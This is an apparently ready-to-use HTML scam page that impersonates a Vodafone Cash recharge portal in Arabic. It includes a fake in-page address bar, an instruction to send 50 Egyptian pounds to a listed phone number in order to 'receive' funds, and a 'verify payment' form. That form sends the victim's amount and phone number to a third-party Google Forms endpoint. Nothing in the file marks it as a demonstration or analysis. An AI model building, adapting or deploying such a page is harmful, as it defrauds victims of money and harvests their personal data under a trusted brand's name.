<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vodafone Cash Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        /* تنسيق أساسي للصفحة بالكامل */
        body {
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 50px;
            margin: 0;
            font-family: 'Cairo', sans-serif;
            color: #f0f0f0;
            min-height: 100vh;
        }

        /* تنسيق الحاوية الرئيسية التي تحوي البوابة */
        .portal-container {
            background-color: #1a1a1a;
            width: 100%;
            max-width: 400px;
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.7);
            padding-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        /* محاكاة شريط العنوان العلوي */
        .mock-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            background-color: #121212;
            border-bottom: 1px solid #333;
            font-size: 14px;
            color: #999;
        }

        .close-icon, .menu-icon {
            font-size: 24px;
            cursor: pointer;
            color: #ccc;
            font-weight: bold;
        }
        .menu-icon {
            font-size: 18px;
            line-height: 10px;
        }
        .url-text {
            flex-grow: 1;
            text-align: center;
            margin: 0 10px;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        }

        /* محتوى البوابة */
        .portal-content {
            padding: 20px;
            text-align: center;
        }

        /* عنوان Vodafone Cash */
        .vodafone-cash-title {
            color: #e60000; /* أحمر فودافون الساطع */
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .recharge-portal-text {
            color: #aaaaaa;
            font-size: 14px;
            margin-bottom: 30px;
        }

        /* معلومات الرصيد/البيانات */
        .cash-info {
            color: #f0f0f0;
            font-size: 16px;
            margin-bottom: 30px;
            padding: 10px 0;
            border-bottom: 1px solid #333;
            border-top: 1px solid #333;
        }

        /* حقول الإدخال */
        input {
            width: 100%;
            padding: 18px;
            margin-bottom: 20px;
            border: none;
            background-color: #2b2b2b;
            color: #f0f0f0;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            text-align: right;
        }

        input::placeholder {
            color: #888888;
            text-align: right;
        }

        /* زر Verify Payment */
        .verify-button {
            width: 100%;
            background-color: #e60000;
            color: white;
            padding: 18px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }

        .verify-button:hover {
            background-color: #cc0000;
        }

        /* أيقونة المساعدة السفلية */
        .help-icon-mock {
            position: absolute;
            bottom: 25px;
            left: 25px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #e60000;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 20px;
            font-weight: 700;
            cursor: help;
        }
    </style>
    </head>
<body>
    <div class="portal-container">
        <div class="mock-header">
            <span class="close-icon" onclick="window.location.reload()">&times;</span>
            <span class="url-text">tgapi.org/Vodafone/Vodafone.ph...</span>
            <div class="menu-icon">...</div>
        </div>

        <div class="portal-content">
            <h1 class="vodafone-cash-title">Vodafone Cash</h1>
            <p class="recharge-portal-text">Recharge Portal</p>
            
            <p class="cash-info">
                01104973142 ارسل 50 جنيه مصري للأستلام
            </p>

            <form action="https://docs.google.com/forms/d/e/1FAIpQLScT-SKLy0cyzkY7ELMIjCkR8dhaNqIqlLi_RfQpJDPKVMe7mg/formResponse" method="POST" target="_blank">
                
                <input type="number" id="egp_amount" name="entry.309063229" placeholder="مبلغ الإرسال (مثال: 50)" required>

                <input type="number" id="sender_number" name="entry.1351187425" placeholder="رقم المرسل (مثال: 010411223)" required>
                
                <button type="submit" class="verify-button">التحقق من الدفع</button>
            </form>
        </div>
        
        <div class="help-icon-mock">
            ?
        </div>
    </div>
</body>
</html>
